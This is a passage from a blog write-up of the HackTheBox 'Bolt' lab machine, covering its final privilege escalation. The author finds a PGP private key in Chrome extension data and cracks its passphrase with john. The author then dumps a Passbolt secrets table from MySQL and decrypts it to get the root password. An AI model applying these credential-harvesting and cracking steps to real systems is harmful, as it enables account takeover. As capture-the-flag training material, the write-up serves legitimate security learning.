</span></pre></table></code></div></div><p>Reading the passwd file gives us the username clark and eddie. Trying to log in via ssh as eddie with the password found above works, and we have successfully pivoted to the eddie user.</p><h2 id="privilege-escalation"><span class="mr-2">Privilege escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Running linpeas once more we get the following interesting output:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="go">══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js
/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log
</span></pre></table></code></div></div><p>If we read <code class="language-plaintext filepath highlighter-rouge">000003.log</code> we quickly stumble across a private PGP key. Copying the key to a text file on our local machine we can use <code class="language-plaintext highlighter-rouge">pgp2john</code> to extract the hash from the key.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>john hash.txt <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt                                                                                                                                                                           
<span class="go">Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:29 0.05% (ETA: 2022-06-21 08:22) 0g/s 60.79p/s 60.79c/s 60.79C/s patch..maranatha
merrychristmas   (Eddie Johnson)     
1g 0:00:12:09 DONE (2022-06-18 01:07) 0.001370g/s 58.71p/s 58.71c/s 58.71C/s mhines..megan5
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
</span></pre></table></code></div></div><p>We can use the credentials found previously to access the mysql database on the system with the passbolt user via the command <code class="language-plaintext highlighter-rouge">mysql -u passbolt -p</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
</pre><td class="rouge-code"><pre><span class="gp">mysql&gt;</span><span class="w"> </span>show databases<span class="p">;</span>
<span class="go">+--------------------+
| Database           |
+--------------------+
| information_schema |
| passboltdb         |
+--------------------+
2 rows in set (0.01 sec)

</span><span class="gp">mysql&gt;</span><span class="w"> </span>use passboltdb<span class="p">;</span>
<span class="go">Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
</span><span class="gp">mysql&gt;</span><span class="w"> </span>show tables<span class="p">;</span>
<span class="go">+-----------------------+
| Tables_in_passboltdb  |
+-----------------------+
| account_settings      |
| action_logs           |
| actions               |
| authentication_tokens |
| avatars               |
| comments              |
| email_queue           |
| entities_history      |
| favorites             |
| gpgkeys               |
| groups                |
| groups_users          |
| organization_settings |
| permissions           |
| permissions_history   |
| phinxlog              |
| profiles              |
| resource_types        |
| resources             |
| roles                 |
| secret_accesses       |
| secrets               |
| secrets_history       |
| user_agents           |
| users                 |
+-----------------------+
25 rows in set (0.00 sec)

</span><span class="gp">mysql&gt;</span><span class="w"> </span><span class="k">select</span> <span class="k">*</span> from secrets<span class="p">;</span>
<span class="go">---SNIP---
-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----
</span></pre></table></code></div></div><p>This secret message can be decrypted with the PGP key and password we found earlier. Save the message to a text file and use the following commands:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="go">┌──(bitis㉿workstation)-[~/htb/Machines/bolt]
</span><span class="gp">└─$</span><span class="w"> </span>gpg <span class="nt">--pinentry-mode</span> loopback <span class="nt">--passphrase</span> merrychristmas <span class="nt">-d</span> secret.pgp 
<span class="go">gpg: encrypted with RSA key, ID F65CA879A3D77FE4
gpg: decryption failed: No secret key
                                                                                                                                                                                                                                            
┌──(bitis㉿workstation)-[~/htb/Machines/bolt]
</span><span class="gp">└─$</span><span class="w"> </span>gpg <span class="nt">--batch</span> <span class="nt">--import</span> pgp.key                                                                                                                                                                                                        2 ⨯
<span class="gp">gpg: key 1C2741A3DC3B4ABD: public key "Eddie Johnson &lt;eddie@bolt.htb&gt;</span><span class="s2">" imported
</span><span class="go">gpg: key 1C2741A3DC3B4ABD: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                                                                                                                                                                                            
┌──(bitis㉿workstation)-[~/htb/Machines/bolt]
</span><span class="gp">└─$</span><span class="w"> </span>gpg <span class="nt">--pinentry-mode</span> loopback <span class="nt">--passphrase</span> merrychristmas <span class="nt">-d</span> secret.pgp
<span class="go">gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
</span><span class="gp">      "Eddie Johnson &lt;eddie@bolt.htb&gt;</span><span class="s2">"
</span><span class="go">{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}gpg: Signature made Sat 06 Mar 2021 04:33:54 PM CET
gpg:                using RSA key 1C2741A3DC3B4ABD
</span><span class="gp">gpg: Good signature from "Eddie Johnson &lt;eddie@bolt.htb&gt;</span><span class="s2">" [unknown]
</span><span class="go">gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD
                                                                                                                                                                                                                                            
┌──(bitis㉿workstation)-[~/htb/Machines/bolt]
</span><span class="gp">└─$</span><span class="w"> 
</span><span class="go">
</span></pre></table></code></div></div><p>The password found in the decrypted message can be used to log in as root on the machine!</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">eddie@bolt:~/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf$</span><span class="w"> </span>su -
<span class="go">Password: 
</span><span class="gp">root@bolt:~#</span><span class="w"> 
</span></pre></table></code></div></div><p>Rooted!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/medium-box/" class="post-tag no-text-decoration" >medium-box</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/pgp/" class="post-tag no-text-decoration" >pgp</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Bolt writeup - BitisGabonica&amp;url=https://bitisg.github.io/posts/Bolt/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Bolt writeup - BitisGabonica&amp;u=https://bitisg.github.io/posts/Bolt/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://bitisg.github.io/posts/Bolt/&amp;text=Bolt writeup - BitisGabonica" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DroidComp/">DroidComp writeup</a><li><a href="/posts/Faculty/">Faculty writeup</a><li><a href="/posts/Trick/">Trick writeup</a><li><a href="/posts/Seal/">Seal writeup</a><li><a href="/posts/Devzat/">Devzat writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Unicode/"><div class="card-body"> <em class="timeago small" data-ts="1658062800" > 2022-07-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Unicode writeup</h3><div class="text-muted small"><p> Summary This box focuses on exploiting an authentication system using a jwt with an insecure jku parameter. After this, we can do unicode normalization to gain lfi, which will allow us to get a pas...</p></div></div></a></div><div class="card"> <a href="/posts/Faculty/"><div class="card-body"> <em class="timeago small" data-ts="1659877200" > 2022-08-07 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Faculty writeup</h3><div class="text-muted small"><p> Summary Foothold We start out by doing an nmap port scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(bitis㉿workstation)-[~/Downloads] └─$ nmap -sC -sV 10.129.227.208 Starting Nmap 7.92 (...</p></div></div></a></div><div class="card"> <a href="/posts/Shared/"><div class="card-body"> <em class="timeago small" data-ts="1660482000" > 2022-08-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shared writeup</h3><div class="text-muted small"><p> Summary Foothold We start out by doing an nmap port scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 15...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Bashed/" class="btn btn-outline-primary" prompt="Older"><p>Bashed writeup</p></a> <a href="/posts/BountyHunter/" class="btn btn-outline-primary" prompt="Newer"><p>Bountyhunter writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-4RZWBJKYF3"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-4RZWBJKYF3'); }); </script>
